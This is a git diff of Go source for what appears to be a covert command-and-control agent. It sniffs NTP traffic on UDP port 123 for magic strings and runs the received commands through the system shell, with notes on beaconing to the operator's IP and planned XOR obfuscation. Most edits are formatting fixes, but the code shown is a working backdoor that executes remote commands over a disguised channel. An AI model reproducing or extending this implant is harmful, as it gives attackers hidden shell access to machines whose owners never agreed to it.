@@ -24,7 +24,7 @@ func StartSniffer(newAgent agent.Agent) {
 			buffer = int32(1600)
 			filter = "udp and port 123" //note for myself: listening for any NTP traffic, magic string search
 			//when i send ping (from server) for the first time, it should take note of my IP and call setup. store that for beacons
-			//if i ping again from a different IP, calls setup again with the new IP.
+			//if i ping again from a different IP, calls setup again with the new IP. fixes the ntp.fun dns issue
 		)
 
 		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
@@ -40,18 +40,18 @@ func StartSniffer(newAgent agent.Agent) {
 
 		source := gopacket.NewPacketSource(handler, handler.LinkType())
 		for packet := range source.Packets() {
-			ret,cont := harvestInfo(packet)
+			ret, cont := harvestInfo(packet)
 			if ret != "ignore" {
 				msg += ret
 			}
 			if cont == "COMD" {
 				runCommand(msg, newAgent)
 				msg = ""
-			}else if cont == "KILL" {
+			} else if cont == "KILL" {
 				//start shutdown
-			}else if cont == "PING" {
+			} else if cont == "PING" {
 				//resync
-			}else if cont == "ignore" {
+			} else if cont == "ignore" {
 				continue
 			}
 		}
@@ -63,13 +63,13 @@ func harvestInfo(packet gopacket.Packet) (string, string) {
 	if app != nil {
 		final := decode(app.LayerContents())
 		index := strings.Index(final, "COM")
-		if strings.Contains(final, "COMU"){
+		if strings.Contains(final, "COMU") {
 			return final[index+4:], "COMU"
-		}else if strings.Contains(final, "COMD"){
+		} else if strings.Contains(final, "COMD") {
 			return final[index+4:], "COMD"
-		}else if strings.Contains(final, "KILL") {
+		} else if strings.Contains(final, "KILL") {
 			return "", "KILL"
-		}else if strings.Contains(final, "PING") {
+		} else if strings.Contains(final, "PING") {
 			return "", "PING" //TODO server auto pings agent if goes to MIA, hoping for change response
 		}
 	}
@@ -80,7 +80,7 @@ func runCommand(msg string, newAgent agent.Agent) {
 	//msgArr := strings.Split(msg, " ")
 	fmt.Println(msg)
 	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()
-		
+
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Println("Couldn't execute command")
@@ -89,15 +89,14 @@ func runCommand(msg string, newAgent agent.Agent) {
 	fmt.Println(string(output))
 } //should this go in agent?
 
-func resync () {
+func resync() {
 
 } //should this go in agent?
 
-func decode (content []byte) string {
+func decode(content []byte) string {
 	return string(content)
 	//TODO fix later with single XOR byte
 }
-
 
 //encode/decode/craft packets
 /*
@@ -106,6 +105,5 @@ func Encode(data string) Packet { //fix args
 }*/
 
 //More notes for myself
-//server will run on two main threads: listening for connections (always) and prompt
+//server will run on two main threads: listening for connections (always) -> action thread. And prompt.
 //client will run on two main threads: sniffing traffic (always) and then responding to said traffic. maybe split the second part up into more strings too
-
